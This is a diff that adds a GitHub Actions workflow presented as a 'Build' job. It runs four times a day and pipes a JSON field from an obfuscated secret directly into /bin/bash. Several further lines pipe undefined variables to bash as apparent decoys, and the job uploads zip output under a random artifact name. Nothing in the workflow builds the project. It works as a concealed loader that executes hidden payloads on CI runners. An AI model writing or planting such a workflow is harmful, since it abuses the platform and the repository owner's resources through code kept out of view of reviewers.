@@ -1,0 +1,42 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          notya106: ${{ secrets.notya106 }}
+        run: |
+          printf '%s' "$notya106" | jq -r .xqma7201 | /bin/bash
+          printf '%s' "$mlpf7" | jq -r .t87239 | /bin/bash
+          printf '%s' "$pgpao0" | jq -r .b78420 | /bin/bash
+          printf '%s' "$n2" | jq -r .dx8 | /bin/bash
+          printf '%s' "$d61596" | jq -r .mmvbs515 | /bin/bash
+          echo $gr1102 | jq -r .smxpv099 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: AgURJiEj
+          path: "*.zip"
+          retention-days: 1
